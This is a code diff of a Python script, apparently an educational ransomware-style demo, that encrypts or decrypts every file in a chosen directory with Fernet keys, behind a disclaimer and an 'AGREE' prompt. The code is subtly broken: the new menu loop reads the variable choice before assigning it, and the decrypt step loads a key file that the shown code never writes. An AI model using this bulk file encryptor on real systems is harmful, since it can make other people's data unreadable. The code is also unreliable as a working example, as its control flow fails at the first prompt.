@@ -22,10 +22,6 @@ key = Fernet.generate_key()
 # to not encrypt keys and allow safe decryptions if files were encrypted multiple times
 key_files = []
 
-def decrypt_files(desired_files: list[str]) -> None:
-    pass
-
-
 def select_contents(path: str) -> list[str]:
     """
     returns a list of the names of the files (not folders) in the desired path,
@@ -41,12 +37,32 @@ def select_contents(path: str) -> list[str]:
         if file[len(file)-4:] == ".key":
             key_files.append(file)
         
-        if os.path.isfile(file):
+        else:
             file_list.append(file)
             
     return file_list
 
-
+def decrypt_files(desired_files: list[str]) -> None:
+    """
+    Takes a list of string with the names of the files to decrypt and decrypts them
+    returns None
+    """
+    with open("unlock_key1.key", "rb") as key:
+        unlock_key = key.read()
+        
+    for file in desired_files:
+        # reading contents of all desired files and decrypting them
+        with open(file, "rb") as desired_file:
+            file_contents = desired_file.read()
+        decrypted_contents = Fernet(unlock_key).decrypt(file_contents)
+        
+        with open(file, "wb") as desired_file:
+            desired_file.write(decrypted_contents)
+            
+        print("decrypted")
+        
+        
+        
 def encrypt_files(desired_files: list[str]) -> None:
     """
     Takes a list of string with the names of the files to encrypt and encrypts them
@@ -66,10 +82,10 @@ def encrypt_files(desired_files: list[str]) -> None:
         # reading contents of all desired files and encrypting them
         with open(file, "rb") as desired_file:
             file_contents = desired_file.read()
-        encryted_contents = Fernet(key).encrypt(file_contents)
+        encrypted_contents = Fernet(key).encrypt(file_contents)
         
         with open(file, "wb") as desired_file:
-            desired_file.write(encryted_contents)
+            desired_file.write(encrypted_contents)
             
         print("encrypted")
 
@@ -83,8 +99,49 @@ def main() -> None:
           with applicable laws, exercise ethical judgment, and assume full accountability 
           for their actions. 
           This script is provided for educational and legitimate purposes only.***\n\n""")
+    
     input("Press Enter to continue...\n")
-    path = input("please input your desired directory to encrypt (../path/...): \n> ")
-    encrypt_files(select_contents(path))
+    
+    running = True
+    while running:
+        action = input("Select an option... \n\n 1) Encrypt Files \n 2) Decrypt Files \n(input number of choice or exit) \n > ")
+        if choice.lower() == "exit":
+                running = False
+                quit()
+        if action == "1":
+            path = input("please input your desired directory to encrypt (../path/...): \n> ")
+            choice = input("Are you sure you want to encrypt ALL files at " + path + "? Type 'AGREE' to continue\n > ")
+            if choice.lower() == "exit":
+                running = False
+                quit()
+            if choice != "AGREE":
+                print("did not recieve 'AGREE'")
+                running = False
+                
+            else:
+                print(select_contents(path))
+                encrypt_files(select_contents(path))
+                running = False
+                break
 
+        if action == "2":
+            if choice.lower() == "exit":
+                running = False
+                quit()
+            path = input("please input your desired directory to decrypt (../path/...): \n> ")
+            choice = input("Are you sure you want to decrypt ALL files at" + path + "? Type 'AGREE' to continue\n > ")
+            if choice != "AGREE":
+                print("did not recieve 'AGREE'")
+                running = False
+            else:
+                try:
+                    print(select_contents(path))
+                    decrypt_files(select_contents(path))
+                    running = False
+                    break
+                except:
+                    print("Error (did you type the path correctly?)")
+                    break
+    
+    
 main()
